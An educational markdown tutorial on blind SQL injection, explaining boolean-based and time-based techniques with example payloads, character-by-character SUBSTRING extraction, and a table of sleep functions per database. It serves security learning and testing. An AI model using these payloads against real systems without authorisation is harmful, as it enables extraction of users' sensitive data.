# 🧠 SQL Injection – Blind SQL Injection

## 📌 Overview

Blind SQL Injection occurs when:

* The application does NOT return database errors
* The application does NOT directly display query results

Instead, attackers infer information by observing:

* Response differences
* Application behavior
* Time delays

---

## 🧠 Core Concept

> Even if no data is visible, the database still responds internally.
> We extract information by observing indirect signals.

---

# 🔍 Types of Blind SQL Injection

## 1. Boolean-Based Blind SQL Injection

## 2. Time-Based Blind SQL Injection

---

# 🔍 1. Boolean-Based Blind SQL Injection

## 🧠 Concept

Send conditions that evaluate to:

* TRUE → normal response
* FALSE → different response

---

## 🔹 Example Payloads

```sql id="b1n4tr"
' AND 1=1--
' AND 1=2--
```

### 🔍 Observation:

* `1=1` → normal page
* `1=2` → empty or different page

### 📌 Meaning:

* Application evaluates conditions
* SQL injection confirmed

---

## 🔍 Extracting Data (Character by Character)

### 🔹 Payload

```sql id="c7z9k2"
' AND SUBSTRING(username,1,1)='a'--
```

### 🔍 Observation:

* TRUE → normal response
* FALSE → different response

### 📌 Meaning:

* First character of username is 'a'

---

## 🔁 Repeat Process

* Change position → `SUBSTRING(username,2,1)`
* Change character → `a, b, c...`

👉 Extract full data step-by-step

---

# 🔍 2. Time-Based Blind SQL Injection

## 🧠 Concept

Use delays to determine TRUE or FALSE conditions.

---

## 🔹 Example Payload (MySQL)

```sql id="k5d8q1"
' AND IF(1=1, SLEEP(5), 0)--
```

### 🔍 Observation:

* Response delayed by 5 seconds

### 📌 Meaning:

* Condition is TRUE

---

## 🔹 False Condition

```sql id="u8m3re"
' AND IF(1=2, SLEEP(5), 0)--
```

### 🔍 Observation:

* No delay

### 📌 Meaning:

* Condition is FALSE

---

## 🔍 Extracting Data with Time-Based SQLi

### 🔹 Payload

```sql id="y3x8pn"
' AND IF(SUBSTRING(username,1,1)='a', SLEEP(5), 0)--
```

### 🔍 Observation:

* Delay → character is 'a'
* No delay → character is not 'a'

---

# 🔍 DB-Specific Time Functions

| Database   | Payload                 |
| ---------- | ----------------------- |
| MySQL      | `SLEEP(5)`              |
| PostgreSQL | `pg_sleep(5)`           |
| SQL Server | `WAITFOR DELAY '0:0:5'` |
| Oracle     | `DBMS_LOCK.SLEEP(5)`    |

---

# ⚠️ Challenges in Blind SQLi

* Slow data extraction
* Requires multiple requests
* Harder to detect than normal SQLi

---

# 🎯 Key Takeaways

* Blind SQLi works without visible output
* Uses:

  * Boolean logic
  * Time delays
* Data is extracted:

  * Character by character
  * Condition by condition

---

# 🧠 Pro Mindset

Do not think:

> “I don’t see any data”

Think:

> “How can I make the database reveal data indirectly?”

---

# 🔁 General Blind SQLi Workflow

1. Confirm injection:

```sql id="c4l8dn"
' AND 1=1--
' AND 1=2--
```

2. Identify technique:

* Response difference → Boolean
* Time delay → Time-based

3. Extract data:

* Use SUBSTRING
* Test character by character

---

# 📌 Real-World Relevance

* Most modern applications hide errors
* Blind SQLi is common in:

  * Production systems
  * Bug bounty targets
* Critical vulnerability despite no visible output

---

# 📌 Conclusion

Blind SQL injection allows attackers to extract sensitive data even when applications do not directly display database responses.

---
